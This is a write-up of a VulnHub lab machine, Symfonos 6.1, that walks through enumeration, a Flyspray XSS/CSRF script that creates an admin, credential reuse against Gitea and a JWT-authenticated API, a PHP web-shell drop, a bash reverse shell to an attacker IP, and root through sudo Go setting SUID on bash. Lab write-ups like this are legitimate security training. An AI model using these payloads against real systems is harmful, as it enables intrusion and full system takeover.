---
aliases: []
tags:
  - writeup
  - machine
  - vulnhub
  - linux
  - ssh
  - csrf
  - gitea
  - reverse-shell
  - sudo
  - go
machine: Symfonos
platform: Linux
difficulty: Intermediate/Hard
date: 2026-09-23
techniques:
  - SSH user enumeration
  - CSRF
  - Gitea credential reuse
  - Reverse shell
  - Sudo privilege escalation through Go
cve: []
initial vector: Web services and Gitea enumeration
privilege escalation: Sudo Go execution to set the SUID bit on bash
author: null
source: https://www.vulnhub.com/entry/symfonos-61,458/
---

- **Symfonos 6.1 machine**: [https://www.vulnhub.com/entry/symfonos-61,458/](https://www.vulnhub.com/entry/symfonos-61,458/)

## Reconnaissance

In this case the machine already gives us its IP, so an arp-scan isn't necessary, but we can run one to be sure.
### Ping
```
ping -c 1 192.168.18.238
```

### Nmap

We run the command as administrator.
This reveals the open ports.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.237 -oG allPorts
```

Once the ports are found, we run a set of scripts against them. *In this case: 22,80,3000,3306,5000*

```bash
nmap -sC -sV -p22,80,3000,3306,5000 192.168.18.238 -oN Targgeted
```
The machine runs an SSH older than 7.7, so it may be vulnerable to *SSH user enumeration*.

```bash
nmap --script http-enum -p22,80,3000,3306,5000 192.168.18.238 -oN webScan 
```
We open the browser to check the content but don't find much, just as nmap didn't report much either.
On the other ports we find useful things: on the site at port 3000 we find a *Gitea* with 2 users, similar to GitHub. On port 5000 we find a possible API.

We'll use gobuster and a wordlist to see if we find anything.
```bash
gobuster dir -u http://192.168.18.238/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```
We find the */posts* directory with a possible user Achilles; to test it we pull the .py from searchsploit into our working directory. (*The .py has to run with python2.7, which I didn't have installed, so I spent almost an hour installing Python and OpenSSL, which turns out to be essential. Add to that not having the seclists wordlists installed for gobuster, and that's nearly 3 hours at the computer just on the recon phase. After installing everything, I still had to install paramiko.*)

```python
python2.7 45939.py 192.168.18.238 achilles 2>/dev/null
```
The user is valid, and we could try to find valid credentials with Hydra, but we wouldn't find anything.
The medium wordlist finds nothing, so we try the big one.
```bash
gobuster dir -u http://192.168.18.238/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20
```
We find another directory, */flyspray*; searching it in searchsploit returns several vulnerabilities, but we don't know the version. Flyspray is open source, so we can browse the whole project on GitHub to find where files like *changelog.txt* live, and at http://192.168.18.238/flyspray/docs/UPGRADING.txt we find version 1.0.
and in searchsploit a CSRF for that same version.

## Exploitation

### Flyspray CSRF to create an admin
To run the exploit we need to create a user and log in; in the realname field, as a test, we can put *"><script>alert("XSS")</script>* and see that it works, so we force it to load an external resource and execute JavaScript. ("><script src="http://192.168.18.226/pwned.js"</script>) and this is the script:
```java
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();

```
This script should create a user called hacker with password 12345678.
We log in and find the credentials *Achilles:h2sBr9gryBunKdF9*; to connect over SSH we'd either need the private key or our key in authorized_keys. So we try Gitea and can see his private projects.
He has credentials exposed in */symfonos-blog*, but for the MariaDB SQL, besides the credentials, we also need to be an authorized host.

Poking around his projects we can view *index.php* in raw, with a *preg_replace* using the *e* modifier, which is no longer supported because you can inject PHP code into the corresponding string.

### Gitea credential reuse and API RCE
There is another project called *symfonos-api* that looks like the API running on port 5000. After trying several things, from the project content we figure out that we can send a curl to the API with the Achilles credentials we have.
```bash
curl -s -X POST "http://192.168.18.238:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles", "password":"h2sBr9gryBunKdF9"}' | jq
```
This gives us the *jsonwebToken:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTA3ODM0ODEsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.SmA8pt_2TcKscZHbk-cLJhQ0niYuOwifrFkmObOFp4w*, but we don't have the secret, so we can't tamper with it.
Everything points to abusing the API via the PATCH method, specifying the id and carrying Achilles' session TOKEN.
```bash
curl -s -X PATCH "http://192.168.18.238:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTA3ODM0ODEsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.SmA8pt_2TcKscZHbk-cLJhQ0niYuOwifrFkmObOFp4w' -d $'{"text": "file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}' 
```
What we have in this command is:
- The *PATCH* method found in the Gitea project, used for updates.
- The API *URL* with the content type it accepts.
- The *json webTOKEN* of the Achilles user, because not every user can make requests to the API.
- Finally, to set up a reverse shell, since we have remote command execution, we use PHP tooling here because single and double quotes might not be interpreted if done in bash; we use *file_put_contents*, which creates a file and places whatever you tell it inside. Again, since some special characters could cause problems, we create a data file containing the usual URL cmd script and base64-encode it.
```php
<?php
	system($_GET['cmd']);
?>
```

```bash
base64 -w 0 data; echo
```
### Reverse shell
Since this command creates a *cmd.php* file and gives us remote command execution, we start a netcat listener on 443 from the attacker machine and send ourselves a shell through the URL.
```url
http://192.168.18.238/posts/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.226/443 0>%261"
```

and we upgrade the TTY:
```bash
script /dev/null -c bash
#ctrl + z
stty raw -echo; fg
reset xterm

export TERM=xterm
export SHELL=bash
stty rows 44 columns 184

```
### Stabilising access over SSH
We're inside the machine; all that's left is to escalate privileges, but now that we're in we can use the SSH service. We connect as the Achilles user with the earlier password. First we delete old SSH keys on the attacker machine, then create new SSH keys and swap them on the victim.

```bash
rm ~/.ssh/*
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub | xclip -sel clip
```
We replace the keys on the victim machine.
```shell
rm authorized_keys
vi authorized_keys
chmod 600 authorized_keys
```

And we connect over SSH as achilles with *ssh achilles@192.168.18.238* — it's important to type *yes*.

## Privilege escalation
We run *sudo -l* and find a NOPASSWD entry for Go. We'll create a .go file to give ourselves a shell:
```Go
package main

import (
    "log"
    "os/exec"
)

func main() {

    cmd := exec.Command("chmod", "u+s", "/bin/bash")

    err := cmd.Run()

    if err != nil {
        log.Fatal(err)
    }
}
```
We run the following command and then *bash -p*, and that's it.
```bash
sudo /usr/local/go/bin/go run example.go
```

![[Pasted image 20260923191706.png|Root shell after running the Go script with sudo]]